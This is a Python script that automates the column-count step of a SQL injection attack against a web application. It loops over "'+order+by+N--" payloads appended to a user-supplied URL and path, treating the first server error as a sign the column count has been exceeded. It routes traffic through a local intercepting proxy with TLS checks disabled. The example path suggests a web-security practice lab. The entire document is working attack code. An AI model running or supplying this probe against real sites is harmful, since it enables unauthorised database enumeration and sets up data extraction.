import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_cols(url, path):
	for i in range(1, 20):
		sql_payload = "'+order+by+%s--" %i
		r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
		res = r.text
		if "Internal Server Error" in res:
			return i - 1
		i += 1
	return False


if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
		path = sys.argv[2].strip()
	except IndexError:
		print('[-] Usage %s <url> <path>' % sys.argv[0])
		print('[-] Example: %s www.example.com /filter?category=office' % sys.argv[0])
		sys.exit(-1)

	print('[+] Figuring number of columns...')
	num_columns = exploit_sqli_cols(url, path)
	if num_columns:
		print(f'[+] number of columns is {str(num_columns)}.')
	else:
		print('[-] cannot determine the number of columns')